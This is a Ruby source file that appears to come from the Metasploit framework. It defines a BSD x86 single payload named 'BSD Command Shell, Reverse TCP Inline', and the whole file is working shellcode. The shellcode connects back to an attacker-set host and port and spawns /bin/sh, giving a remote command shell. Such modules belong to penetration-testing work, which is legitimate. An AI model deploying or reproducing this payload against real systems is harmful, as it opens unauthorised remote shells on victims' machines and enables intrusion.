require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Bsd
module X86

module ShellReverseTcp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'BSD Command Shell, Reverse TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'skape',
			'Platform'      => 'bsd',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LHOST'    => [ 0x0a, 'ADDR' ],
							'LPORT'    => [ 0x13, 'n'    ],
						},
					'Payload' =>
						"\x6a\x61\x58\x99\x52\x42\x52\x42\x52\x68\x7f\x00\x00\x01\xcd\x80" +
						"\x68\x10\x02\xbf\xbf\x89\xe1\x6a\x10\x51\x50\x51\x97\x6a\x62\x58" +
						"\xcd\x80\x6a\x02\x59\xb0\x5a\x51\x57\x51\xcd\x80\x49\x79\xf6\x50" +
						"\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x53" +
						"\xb0\x3b\xcd\x80"
				}
		))
	end

end

end end end end end
